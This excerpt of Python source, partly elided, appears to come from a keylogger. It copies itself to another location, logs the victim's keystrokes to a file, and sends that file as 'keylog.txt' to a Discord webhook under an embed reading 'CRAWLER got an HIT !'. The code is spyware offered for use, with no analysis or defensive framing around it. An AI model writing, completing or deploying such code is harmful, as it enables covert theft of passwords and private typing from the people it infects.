...
webhook = DiscordWebhook(url="WebHook_URL", username = "Caught Bot", avatar_url = "https://avatars.githubusercontent.com/u/91149112")

if not os.path.exists(destination_path):
    shutil.copy2(script_path, destination_path)

if not os.path.exists(destination_folder + "log.txt"):
    with open(destination_folder + "log.txt", "w") as file1:
      file1.write("First time file")

with open(destination_folder + "log.txt", "r") as file:
    webhook.add_file(file=file.read(), filename="keylog.txt")

embed = DiscordEmbed(title=f"**CRAWLER got an HIT !**",
...
def write_file(keys):
    ...
    with open(destination_folder + "log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("Key") == -1:
                f.write(k)
